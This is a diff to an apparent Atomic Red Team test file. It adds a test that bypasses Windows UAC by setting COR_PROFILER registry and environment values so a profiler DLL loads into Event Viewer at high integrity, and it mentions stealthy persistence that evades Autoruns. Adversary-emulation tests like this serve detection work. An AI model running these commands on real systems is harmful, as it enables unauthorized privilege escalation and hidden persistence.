@@ -136,3 +136,37 @@ atomic_tests:
     cleanup_command: |
       rd "\\?\C:\Windows \" /S /Q >nul 2>nul
       del "c:\testbypass.exe" >nul 2>nul
+
+- name: Bypass UAC using .NET COR_PROIFILER profiling DLL
+  description: |
+    Creates environment variables by modifying the registry to enable a .NET profiler. A simple profiler DLL (`atomicNotepad.dll`) is written to disk and executes 
+    when the CLR is loaded by the Event Viewer process. The Event View executes with high integrity and the profiling DLL will inherit the integrity level of Event Viewer 
+    bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded
+    by a process, however, the notepad process will not execute with high integrity. This technique also can be used to maintain stealthy persistence not detected by Microsoft's Autoruns.
+  supported_platforms:
+    - windows 
+  input_arguments:
+    file_path:
+      description: path to profiler DLL binary to execute UAC Bypass
+      type: String
+      default: PathToAtomicsFolder\T1088\src
+  
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $DllPath = "#{file_path}" + "\atomicNotepad.dll"
+      Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
+      New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value $DllPath -Force | Out-Null
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
+      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value $DllPath -Force | Out-Null
+      Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
+      START MMC.EXE EVENTVWR.MSC
+      Start-Sleep 5
+    cleanup_command: |
+      Write-Host "Removing registry keys" -ForegroundColor Cyan
+      Remove-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -Recurse -Force
+      Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+      Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
+      Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
